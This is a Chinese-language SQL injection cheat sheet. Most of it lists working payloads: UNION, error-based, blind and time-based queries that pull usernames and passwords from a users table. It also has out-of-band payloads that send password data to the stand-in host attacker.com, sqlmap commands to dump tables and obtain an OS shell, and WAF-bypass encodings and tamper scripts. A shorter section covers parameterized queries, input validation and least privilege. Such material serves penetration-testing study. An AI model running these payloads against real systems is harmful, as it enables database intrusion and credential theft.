# SQL注入

## 概述

SQL注入（SQL Injection, SQLi）是最经典的Web安全漏洞之一，攻击者通过将恶意SQL代码注入到应用程序的输入字段中，操纵后端数据库执行非预期的查询。尽管ORM框架和参数化查询已广泛普及，SQL注入仍频繁出现在OWASP Top 10中，尤其在遗留系统、CMS插件和定制开发的业务系统中。

## SQL注入类型

### 按数据传递方式分类

#### 1. 内联注入（In-Band SQLi）

攻击者通过同一通信渠道发起攻击并获取结果。

**基于UNION的注入：**

```sql
-- 确定列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

-- 使用UNION联合查询
' UNION SELECT 1,2,3--

-- 提取数据库信息
' UNION SELECT 1,database(),version()--

-- 获取表名
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--

-- 获取列名
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--

-- 提取数据
' UNION SELECT 1,username,password FROM users--
```

**基于错误的注入：**

```sql
-- 利用错误信息推断结构
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--

-- 通过错误信息提取数据（MySQL）
' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1)))--

-- PostgreSQL错误注入
' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
```

#### 2. 盲注（Blind SQLi）

攻击者无法直接看到查询结果，通过页面响应差异推断数据。

**布尔盲注：**

```sql
-- 测试注入点
' AND 1=1--  （正常返回）
' AND 1=2--  （异常返回）

-- 逐字符猜解
' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='b'--

-- 使用ASCII比较
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>64--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))<91--

-- 逐字符提取完整数据（MySQL）
' AND ORD(MID((SELECT IFNULL(CAST(password AS CHAR),0x20) FROM users ORDER BY id LIMIT 0,1),1,1))>64--
```

**时间盲注：**

```sql
-- MySQL时间盲注
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64, SLEEP(2), 0)--

-- SQL Server时间盲注
'; IF (ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>64) WAITFOR DELAY '0:0:2'--

-- PostgreSQL时间盲注
' AND CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64) THEN pg_sleep(2) ELSE pg_sleep(0) END--

-- Oracle时间盲注
' AND CASE WHEN (ASCII(SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1))>64) THEN DBMS_LOCK.SLEEP(2) ELSE NULL END--
```

#### 3. 带外注入（Out-of-Band SQLi）

攻击者通过不同的通信渠道获取数据，适用于目标对HTTP响应不敏感但数据库可发起网络连接的场景。

```sql
-- MySQL OOB（DNS外带）
' LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test'))--

-- SQL Server OOB
'; DECLARE @q varchar(1024); SET @q='\\'+(SELECT TOP 1 password FROM users)+'.attacker.com\test'; EXEC master.dbo.xp_dirtree @q--

-- Oracle OOB（UTL_HTTP）
' AND UTL_HTTP.request('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1))--
```

### 按注入位置分类

| 类型 | 位置 | 特征 |
|------|------|------|
| GET注入 | URL参数 | `?id=1'` |
| POST注入 | 表单/JSON | 请求体中 |
| Cookie注入 | Cookie值 | `Cookie: user=1'` |
| Header注入 | HTTP头 | User-Agent, X-Forwarded-For |
| Second-Order注入 | 存储后二次触发 | 先存后取 |

## SQLMap使用详解

### 基础操作

```bash
# 自动检测注入点
sqlmap -u "http://target.com/page?id=1"

# 指定注入类型
sqlmap -u "http://target.com/page?id=1" --technique=BEUSTQ

# 获取数据库信息
sqlmap -u "http://target.com/page?id=1" --banner --dbs

# 枚举表
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# 转储表内容
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# 获取OS Shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# 批量扫描
sqlmap -m urls.txt --batch
```

### Tamper脚本（WAF绕过）

| Tamper脚本 | 作用 |
|------------|------|
| `space2comment` | 空格替换为`/**/` |
| `space2plus` | 空格替换为`+` |
| `char2encode` | 字符URL编码 |
| `between` | `>`替换为`NOT BETWEEN` |
| `equaltolike` | `=`替换为`LIKE` |
| `greatest` | `>`替换为`GREATEST` |
| `modsecurityversioned` | ModSecurity特定格式绕过 |
| `charencode` | 全部字符URL编码 |
| `unionalltounion` | `UNION ALL`替换为`UNION` |

```bash
# 使用tamper脚本组合
sqlmap -u "http://target.com/page?id=1" \
  --tamper="space2comment,equaltolike,between" \
  --random-agent --batch
```

### Request注入

```bash
# POST请求注入
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" \
  --method POST

# Cookie注入
sqlmap -u "http://target.com/page" \
  --cookie="id=1*" --level 2

# JSON格式注入
sqlmap -u "http://target.com/api/login" \
  --data='{"username":"admin*","password":"test"}' \
  --headers="Content-Type: application/json"
```

## WAF绕过技术

### HTTP参数污染（HPP）

```text
# 原始请求
?id=1' UNION SELECT 1,2,3--

# 参数污染
?id=1&id=1' UNION SELECT 1,2,3--

# 重复参数绕WAF
?id=1' UNION&id=SELECT 1,2,3--
```

### 注释混淆

```sql
-- 内联注释绕过
'/*!UNION*/ /*!SELECT*/ 1,2,3--

-- 多层嵌套注释
'/**/UN/**/ION/**/SE/**/LECT/**/1,2,3--

-- 使用注释分隔关键字
'UN/**/ION SEL/**/ECT 1,2,3--
```

### 编码绕过

```sql
-- URL编码
%27%20UNION%20SELECT%201%2C2%2C3--

-- 双重URL编码
%2537%2537%2537--  （'编码两次）

-- Unicode编码
' UNION SELECT

-- Hex编码
0x2720554e494f4e2053454c45435420312c322c332d2d
```

## 防御措施

### 参数化查询（Prepared Statement）

```python
# 安全（Python + SQLite）
import sqlite3
conn = sqlite3.connect('db.sqlite')
cursor = conn.cursor()
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# 安全（Node.js + MySQL）
connection.query(
  'SELECT * FROM users WHERE id = ?',
  [userId],
  function(err, results) {}
)

# 安全（Java JDBC）
PreparedStatement ps = conn.prepareStatement(
  "SELECT * FROM users WHERE id = ?"
);
ps.setString(1, userId);
```

### 输入验证

- **白名单验证**：只允许已知合法的字符集（如数字ID）
- **长度限制**：限制输入字段最大长度
- **类型校验**：整数参数强制类型转换
- **关键字过滤**：过滤`UNION`、`SELECT`、`OR`等关键字（辅助手段，不可作为主防御）

### 最小权限原则

- 数据库账户仅授予执行必要操作的最小权限
- 禁止应用程序连接使用`root`或`sa`账户
- 只读操作使用只读数据库账户
- 敏感数据列加密存储

### Web应用防火墙

- 部署WAF（ModSecurity、Cloudflare WAF、AWS WAF）作为额外防御层
- 配置WAF规则阻断SQL注入特征模式
- 定期更新WAF规则库

## 检测与利用工具

| 工具 | 用途 | 特点 |
|------|------|------|
| SQLMap | 自动化SQLi检测与利用 | 功能最全面，支持70+数据库 |
| jSQL Injection | GUI SQL注入工具 | 可视化操作，适合初学者 |
| NoSQLMap | NoSQL注入检测 | MongoDB/CouchDB注入 |
| sqlninja | MSSQL利用 | 支持OS Shell和隧道 |
| Havij | 自动化SQLi（已停止更新） | GUI操作简单 |

## 参考资源

- [SQLMap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
